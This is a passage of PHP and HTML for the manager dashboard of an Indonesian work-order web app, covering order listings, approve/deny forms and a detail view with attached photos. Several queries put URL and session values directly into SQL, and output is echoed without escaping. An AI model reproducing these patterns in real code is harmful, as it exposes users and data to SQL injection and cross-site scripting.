<?php
include('../dbconfig.php');
session_start(); //memulai session
if( !isset($_SESSION['saya_manager']) ) //jika session login bukan manager
{
header('location:./../'.$_SESSION['akses']); //alihkan berdasarkan hak akses
exit();
}
$nama = ( isset($_SESSION['nama_u']) ) ? $_SESSION['nama_u'] : '';
$query = mysqli_query($db,"SELECT * FROM tb_user WHERE username='$nama' ");
?>
<!-- site head -->
<!DOCTYPE html>
<html lang="en">
 <head>
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
  <title>OREO-Aplikasi Order Perintah Kerja Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-touch-fullscreen" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta content="" name="description" />
  <meta content="" name="author" /> 
  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
  <link href="../css/vendor.min.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/main.css" rel="stylesheet" type="text/css" media="all" />
  <link href="../css/color-settings.css" rel="stylesheet" type="text/css" media="all" data-role="color-settings"/>
</head>
  <body class="nav-md theme-green">
    <!-- /site head -->
    <div class="main-container">
      <!-- sidebar -->
      <div class="sidebar">
        <div class="scroll-wrapper">
          <div class="navbar nav-title">
          </div>
          <div class="nav toggle">
            <a href="javascript:void(0)" id="sidebar-menu-toggle" class="btn btn-circle ripple">
              <i class="fa fa-times"></i>
            </a>
          </div>
          <div class="clearfix"></div>
          <!-- menu profile quick info -->
          <div class="profile clearfix">
            <div class="profile-pic">
            <?php
              $a = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
              while($aa=mysqli_fetch_array($a)){
                echo "<img src='../img/$aa[foto]' alt='Profile picture' class='rounded-circle profile-img'>";                
              }

            ?>
            </div>
            <div class="profile-info">
              <h2><?php echo $nama; ?></h2>
            </div>
          </div>
          <!-- /menu profile quick info -->
  
          <!-- sidebar menu -->
          <div id="sidebar-menu" class="main-menu-wrapper">
            <div class="menu-section">
              <ul class="nav side-menu flex-column">
                <li class="nav-item">
                  <a href="index.php?page=dashboard" title="Dashboard">
                    <i class="fa fa-home" aria-hidden="true"></i>
                    <span>Dashboard</span>
                  </a>
                </li>
                <li class="nav-item has-child">
                  <a href="index.php?page=in_progress_order" class="ripple" title="Icons">
                    <i class="fa fa-clone" aria-hidden="true"></i>
                    <span>In Progress Order</span>
                    <span class="fa fa-chevron-right" aria-hidden="true"></span>
                  </a>
                  <ul class="nav child-menu">
                    <li class="child-menu-title">In Progress Order</li>
                  </ul>
                </li>
                <li class="nav-item has-child">
                  <a href="index.php?page=complete_order" class="ripple" title="Tables">
                    <i class="fa fa-table" aria-hidden="true"></i>
                    <span>Complete Order</span>
                    <span class="fa fa-chevron-right" aria-hidden="true"></span>
                  </a>
                  <ul class="nav child-menu">
                    <li class="child-menu-title">Complete Order</li>
                  </ul>
                </li>
                <li class="nav-item has-child">
                  <a href="../logout.php" class="ripple" title="Extras">
                    <i class="fa fa-windows" aria-hidden="true"></i>
                    <span>Logout</span>
                    <span class="fa fa-chevron-right"></span>
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <!-- /sidebar menu -->
        </div>
      </div>
      <!-- /sidebar -->
      <div class="content-wrapper">
        <!-- header content  -->
        <header class="header">
          <nav class="header-menu">
            <div class="nav toggle">
              <a href="javascript:void(0)" id="menu-toggle" class="ripple">
                <span class="bars"></span>
              </a>
            </div>
            <ul class="nav navbar-nav navbar-right">
              <li class="search-wrap d-sm-none d-md-block">
                 
              </li>
              <li class="profile-dropdown dropdown">
                <a href="javascript:void(0)" class="user-profile dropdown-toggle ripple" data-toggle="dropdown" aria-expanded="false">
                  <span class="d-none d-sm-block"> <h2><?php echo $nama; ?></h2></span>
                  <span class="fa fa-angle-down"></span>
                </a>
                <ul class="dropdown-menu float-right">
                  <li class="d-none d-block-xs p-0">
                    <button type="button" class="close btn btn-circle"><i class="fa fa-close"></i></button>
                    <div class="profile clearfix">
                      <div class="profile-pic">
                        <?php
                        while($data_users=mysqli_fetch_array($query)){
                        ?>
                        <img src="../img/<?php echo $data_users['foto']?>" class="rounded-circle profile-img">
                        <?php
                        }
                        ?>
                      </div>
                      <div class="profile-info">
                        <h2> <h2><?php echo $nama; ?></h2></h2>
                      </div>
                    </div>
                  </li>
                  <li><a href="index.php?page=dashboard"><i class="fa fa-user-o" aria-hidden="true"></i>Profile</a></li>
                  <li><a href="../logout.php"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a></li>
                </ul>
              </li>
            </ul>
          </nav>
        </header>
        <!-- /header content -->
        <?php
        switch ($_GET['page']) {
        // START HALAMAN DASHBOARD
        case 'dashboard':
        // code...
        ?>
        <!-- page content -->
        <div class="main-content small-gutter">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Selamat datang,<b> <?php echo $nama; ?></b></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index.php?page=dashboard">Oreo</a></li>
                <li>
                  <?php
                  $a = mysqli_query($db,"select * from tb_user where nama='$nama'");
                  while($aa=mysqli_fetch_array($a)){
                    echo $aa["level"];
                  }
                  ?>

                </li>
                <li class="active">Dashboard</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <!-- END PAGE COVER -->
             <div class="row tile-count">
                    <div class="col-sm-6 col-md-6 col-lg-3 col-xl-3 tile-stats-count" style="margin:2%;">
                        <div class="row">
                            <div class="col-md-6 col-sm-6 col-6"><i class="fa fa-clone text-danger" aria-hidden="true" style="font-size: 32pt;"></i>
                                <h5 class="text-muted text-uppercase text-danger">Order Kerja Masuk</h5>
                            </div>
                            <div class="col-md-6 col-sm-6 col-6">
                            <?php
                              $a = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket");
                              while($jum = mysqli_fetch_array($a)){
                                 echo"<h3 class='counter text-right m-t-15 text-danger'>$jum[JUMLAH]</h3>";
                              }
                            ?>

                            </div>
                        </div>
                    </div>

                    <div class="col-sm-6 col-md-6 col-lg-3 col-xl-3 tile-stats-count" style="margin:2%;">
                        <div class="row">
                            <div class="col-md-6 col-sm-6 col-6"><i style="font-size: 32pt;" class="fa fa-table text-info" aria-hidden="true"></i>
                                <h5 class="text-muted text-uppercase text-info">Order Kerja Complete</h5>
                            </div>
                            <div class="col-md-6 col-sm-6 col-6">
                            <?php
                              $a = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=1");
                              while($jum = mysqli_fetch_array($a)){
                                 echo"<h3 class='counter text-right m-t-15 text-info'>$jum[JUMLAH]</h3>";
                              }
                            ?>
                            </div>
                        </div>
                    </div>

                    <div class="col-sm-6 col-md-6 col-lg-3 col-xl-3 tile-stats-count" style="margin:2%;">
                        <div class="row">
                            <div class="col-md-6 col-sm-6 col-6"> <i style="font-size: 32pt;"class="fa fa-file text-warning" aria-hidden="true"></i>
                                <h5 class="text-muted text-uppercase text-warning">Order Kerja Deny</h5>
                            </div>
                            <div class="col-md-6 col-sm-6 col-6">
                            <?php
                              $a = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=3");
                              while($jum = mysqli_fetch_array($a)){
                                 echo"<h3 class='counter text-right m-t-15 text-warning'>$jum[JUMLAH]</h3>";
                              }
                            ?>
                            </div>
                            <div class="col-12">
                            </div>
                        </div>
                    </div>
                  </div>         
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->



        <?php
        break;
        // END HALAMAN DASHBOARD
        // START HALAMAN IN PROGRESS ORDER
        case "in_progress_order":
        $batas   = 5;
        $halaman = @$_GET['halaman'];
        if(empty($halaman)){
          $posisi  = 0;
          $halaman = 1;
        }
          else{
          $posisi  = ($halaman-1) * $batas;
        }

         $query = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=0
        LIMIT $posisi,$batas
        ";
        // $res = mysqli_query($db,$sql);
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
     
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index.php?page=dashboard">Oreo</a></li>
                <li>
                  <?php
                  $a = mysqli_query($db,"select * from tb_user where nama='$nama'");
                  while($aa=mysqli_fetch_array($a)){
                    echo $aa["level"];
                  }
                  ?>
                </li>
                <li class="active">In Progress Order</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Daftar In Progress Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                    <div class="row">
                      <div class="col-sm-12 col-lg-4 col-xl-6">
                        <div class="data-table-length">

                        </div>
                      </div>
                      <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                        <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                          <label for="search1">Cari Berkas Order:</label>
                          <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                        <!--  UNTUK NGESET NIP SI YG MENG ACCKANNYA -->
                          
                          <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                            <thead>
                              <tr>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending">
                                  No
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  No Tiket
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Tanggal Buat
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Nama Pekerjaan
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Lokasi
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  STO
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Penyebab
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Status
                                </th>
                              </tr>
                            </thead>
                            <tbody>
                            <?php

                                  $tampil = mysqli_query($db, $query);
                                  $no = $posisi+1;
                                  $nomor=1;

                                  while ($data=mysqli_fetch_array($tampil))
                              {
                              ?>

                              <?php
                                  $d = mysqli_query($db,"SELECT * FROM tb_user WHERE nama='$nama'");
                                  while($dd=mysqli_fetch_array($d)){
                                ?>
                                
                                <?php

                                  echo "<form method='POST' action='index.php?page=proses_acc_order'>";

                                ?>

                                <?php echo "<input type='hidden' value='$data[notiket]' name='notiket'>"; ?>
                                <?php echo "<input type='hidden' value='$dd[nip]' name='nip_penyetuju'>"; ?>
                              <tr>
                                <td class="text-center"><?php echo $data["id"]; ?></td>
                                <td class="text-center"><?php echo"<a href=index.php?page=in_progress_order_detail&notiket=".$data['notiket'].">";
                                echo$data["notiket"];?></a></td>
                                <td><?php echo $data["tanggal_buat"]; ?></td>
                                <td><?php echo $data["namapekerjaan"]; ?></td>
                                <td><?php echo $data["lokasi"]; ?></td>
                                <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                <td><?php echo $data["penyebab"]; ?></td>
                                <!-- <td class="text-center">
                                  <?php
                                  if($data["status"]==1){
                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                  }else{
                                  echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';
                                  
                                  }
                                  ?>
                                </td> -->
                                <td>
                                  <div class="dropdown">
                                    <button class="btn btn-info dropdown-toggle badge-pill badge-danger" type="button"
                                    id="dropdownMenuButton1" data-toggle="dropdown"
                                    aria-haspopup="true" aria-expanded="false" style="margin:auto;">
                                    <?php
                                    if($data["status"]==1){
                                    echo 'Completed';
                                    }else{
                                    echo 'Butuh Persetujuan';
                                    }
                                    ?>
                                    </button>
           
                                    <div class="dropdown-menu" aria-labelledby="dropdownMenuButton1">
                                      
                                      <input type="submit" name="status" value='ACC' style="width: 100%;margin:auto;cursor:pointer" class="dropdown-item"></input> 
                                      <input type="submit" name="status" value='DENY' style="width: 100%;margin:auto;cursor:pointer" class="dropdown-item"></input>

                                      <!-- <a class="dropdown-item" href="index.php?page=proses_acc_order&notiket=<?php echo $data["notiket"]; ?> &status=1&nip_penyetuju=<?php echo $dd["nip"];?>">ACC ORDER</a>
                                      <a class="dropdown-item" href="index.php?page=proses_acc_order&notiket=<?php echo $data["notiket"]; ?> &status=3&nip_penyetuju=<?php echo $dd["nip"];?>">DENY ORDER</a> -->
                                    </div>
                                  </div>
                                  <?php
                                    }
                                  ?>
                                </td>
                              </tr>
                              <?php } ?>
                              </form>
                            </tbody>
                          </table>
                        
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12 col-md-5">
                        <div class="showing-items">Menampilkan
                          <?php
                          $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=0");
                          while($jumlah = mysqli_fetch_array($sql_count)){
                          echo $jumlah["JUMLAH"];
                          }

                          ?>
                          Data Order
                        </div>
                      </div>
                      <?php
                      // Langkah 3: Hitung total data dan halaman serta link 1,2,3
                      $query2     = mysqli_query($db, "select * from tb_tiket WHERE status=0 or status=3");
                      $jmldata    = mysqli_num_rows($query2);
                      $jmlhalaman = ceil($jmldata/$batas);

                      ?>
                      <div class="col-sm-12 col-md-7">
                          <div class="data-table-paginate">
                              <nav>
                                  <ul class="pagination">

                                  <?php

                                  for($i=1;$i<=$jmlhalaman;$i++)
                                  if ($i != $halaman){
                                    echo "  <li class='page-item'> <a href=\"index.php?page=in_progress_order&halaman=$i\" class='page-link'>$i</a></li>";
                                  }
                                  else{
                                    echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
                                  }

                                  ?>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
       <!-- /page content -->
        <?php
        break;
        // END HALAMAN IN PROGRESS ORDER
        // START HALAMAN COMPLETE ORDER
        case "complete_order":
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Getting started!</h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li>
                  <?php
                  $a = mysqli_query($db,"select * from tb_user where nama='$nama'");
                  while($aa=mysqli_fetch_array($a)){
                    echo $aa["level"];
                  }
                  ?>
                </li>
                <li class="active">Complete Order</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Daftar Complete Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                    <div class="row">
                      <div class="col-sm-12 col-lg-4 col-xl-6">
                        <div class="data-table-length">
                        </div>
                      </div>
                      <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                        <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                          <label for="search1">Cari Berkas Order:</label>
                          <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                          <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                            <thead>
                              <tr>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending">
                                  No
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  No Tiket
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Tanggal Buat
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Nama Pekerjaan
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Lokasi
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  STO
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Penyebab
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Status
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Cetak
                                </th>                                
                              </tr>
                            </thead>
                            <tbody>
                              <?php
                                  $batas   = 5;
                                  $halaman = @$_GET['halaman'];
                                  if(empty($halaman)){
                                    $posisi  = 0;
                                    $halaman = 1;
                                  }
                                   else{
                                    $posisi  = ($halaman-1) * $batas;
                                  }

                                   // Langkah 2. Sesuaikan query dengan posisi dan batas
                                   $query  = " SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
                                      FROM ((tb_order
                                      INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
                                      INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
                                      WHERE tb_tiket.status=1 || tb_tiket.status=3 LIMIT $posisi,$batas";

                                  $tampil = mysqli_query($db, $query);
                                  $no = $posisi+1;
                                  $nomor=1;
                                  while ($nomor<=($data=mysqli_fetch_array($tampil)))
                                  {
                              ?>
                              <tr>
                                <td class="text-center"><?php echo $nomor; ?></td>
                                <td class="text-center"><?php echo $data["notiket"];?></td>
                                <td><?php echo $data["tanggal_buat"]; ?></td>
                                <td><?php echo $data["namapekerjaan"]; ?></td>
                                <td><?php echo $data["lokasi"]; ?></td>
                                <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                <td><?php echo $data["penyebab"]; ?></td>
                                <td class="text-center">
                                  <?php
                                  if($data["status"]==1){
                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                  }else if($data["status"]==0){
                                  echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';
                                  }else if($data["status"]==3){
                                  echo '<span class="badge badge-pill badge-warning text-uppercase">Deny</span>';
                                  }
                                  ?>
                                </td>
                                <td class="text-center">
                                  <?php if($data["status"]==1){ ?>
                                  <a href="cetak_order_kerja.php?notiket=<?php echo $data["notiket"]; ?>">
                                    <button type="button" class="btn bg-transparent btn-circle" title="Print">
                                      <b><i class="fa fa-print" ></i></b>
                                    </button>
                                  </a>
                                  <?php
                                   } 
                                  else if($data["status"]==3){?>
                                    <button class="btn width-100-xs bg-transparent btn-circle" data-toggle="modal" data-target=".bd-example-modal-lg" title="Print">
                                      <b><i class="fa fa-print" ></i></b>
                                    </button>
 
                                   <?
                                  } 
                                  ?>
                                </td>                                
                              </tr>
                              <?php 
                              $nomor++;
                              } ?>
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>

                    <!-- Large Modal -->
                    <div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
                      <div class="modal-dialog modal-lg">
                        <div class="modal-content">

                          <div class="modal-header">
                                                <h4 class="modal-title" id="myLargeModalLabel">Surat Order Kerja Tidak Dapat Di Print</h4>
                                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                                    <span aria-hidden="true">×</span>
                                                </button>
                          </div>
                          <div class="modal-body">
                                                <p>Surat Order kerja dengan status "Deny" tidak dapat dicetak</p>
                                             
                          </div>
                        </div>
                     </div>
                    </div>


                    <div class="row">
                      <div class="col-sm-12 col-md-5">
                        <div class="showing-items">Menampilkan
                          <?php
                          $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=1 || status=3");
                          while($jumlah = mysqli_fetch_array($sql_count)){
                          echo $jumlah["JUMLAH"];
                          }
                          ?>
                          Data Order
                        </div>
                      </div>
                      <?php
                                      // Langkah 3: Hitung total data dan halaman serta link 1,2,3
                      $query2     = mysqli_query($db, "select * from tb_tiket WHERE status=1 || status=3");
                      $jmldata    = mysqli_num_rows($query2);
                      $jmlhalaman = ceil($jmldata/$batas);

                      ?>
                      <div class="col-sm-12 col-md-7">
                        <div class="data-table-paginate">
                          <nav>
                            <ul class="pagination">

                                   <?php

                                  for($i=1;$i<=$jmlhalaman;$i++)
                                  if ($i != $halaman){
                                   echo "  <li class='page-item'> <a href=\"index.php?page=complete_order&halaman=$i\" class='page-link'>$i</a></li>";
                                  }
                                  else{
                                   echo " <li class='page-item'> <a class='page-link badge-danger' style='color:white;'>$i</a> </li>";
                                  }

                                  ?>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN COMPLETE ORDER
        // START HALAMAN IN PROGRESS ORDER
        case "in_progress_order_detail":
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.notiket='$_GET[notiket]'
        ";
        $res = mysqli_query($db,$sql);
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Detail In Progress Order No. Tiket <?php echo $_GET["notiket"];?></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Manager</a></li>
                <li class="active">In Progress Order Detail</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Detail In Progress Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                  
                    <?php while ($data=mysqli_fetch_array($res))
                    {
                    ?>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                          
                          <form action="index.php?page=proses_acc_order&notiket=<?php echo $data[notiket];?>" method="POST">
                          <table class="table">
                          <tr>
                            <td colspan="4">
                              <center>
                                <img src="../img/logo_telkom.png"/ style="width:200px;height: auto;">
                              </center>
                           </td>
                            
                            <td>
                              No Tiket 
                            </td>
                            <td>
                              :
                            </td>
                            <td>
                              <?php echo $data["notiket"]; ?>
                            </td>
                            <td colspan="4">
                              <center>
                                <img src="../img/logo_telak.png"/ style="width:200px;height: auto;">
                              </center>
                           </td>
                          </tr>
                          <tr>
                            <td colspan="11"></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Nama Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["namapekerjaan"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Tanggal Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["tanggal_buat"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>                            
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Lokasi Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["lokasi"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Witel</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["witel"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">STO</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["kd_sto"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Penyebab</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["penyebab"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td colspan="11"></td>
                          </tr>
                          <tr>
                            <td colspan="5">
                              <H5><b>Foto Sebelum</b></H4>
                           </td>
       
                            <td>
                            </td>
               
                            <td colspan="5">
                              <H5><b>Foto Sesudah</b></H4>
                           </td>
                          </tr>
                          <tr>
                            <?php 
                            $data_lampiran = mysqli_query($db,"SELECT * FROM tb_lampiran WHERE notiket='$_GET[notiket]'");
                            while ($dt_lampiran=mysqli_fetch_array($data_lampiran))
                            {
                            ?>
                            <td colspan="5">
                              <center>
                                <?php
                                  if(($dt_lampiran['ft_sebelum_2']==null)&&($dt_lampiran['ft_sebelum_3']==null)){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_1]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_sebelum_3']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_2]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_3]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_sebelum_2']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_sebelum_2]' style='width: 200px; height: 180px;' />
                                      ";
                                  }else if($dt_lampiran['ft_sebelum_1']==null){
                                    echo"
                                      Tidak ada foto Sebelum.
                                    ";
                                  }else{
                                    echo"
                                      Tidak ada foto Sebelum.
                                    ";
                                  }                                     
                 
                                ?>
                              </center>
                           </td>
       
                            <td>
                            </td>
               
                            <td colspan="5">
                              <center>
                                <?php
                                  if(($dt_lampiran['ft_progress_2']==null)&&($dt_lampiran['ft_progress_3']==null)){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_progress_1]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_progress_3']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_progress_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_progress_2]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_progress_3]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_progress_2']!=null){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_progress_1]' style='width: 200px; height: 180px;' />
                                      <img src='../lampiran/$dt_lampiran[ft_progress_2]' style='width: 200px; height: 180px;' />
                                      ";
                                  }else if($dt_lampiran['ft_progress_1']==null){
                                    echo"
                                      Tidak ada foto Progress.
                                    ";
                                  }else{
                                    echo"
                                      Tidak ada foto Progress.
                                    ";
                                  }                                     
                 
                                ?>
                            </center>
                           </td>
                          </tr>
                          
                          <tr>
                            <td colspan="11"><center>Foto Sesudah</center></td>
                          </tr>
                          
                          <tr>
                            <td colspan="11">
                              <center>
                                <?php
                                  if(($dt_lampiran['ft_sesudah_2']==null)&&($dt_lampiran['ft_sesudah_3']==null)){
                                    echo"
                                      <img src='../lampiran/$dt_lampiran[ft_sesudah_1]' style='width: 200px; height: 180px;' />
                                    ";
                                  }else if($dt_lampiran['ft_sesudah_3']!=null){
                                    echo"
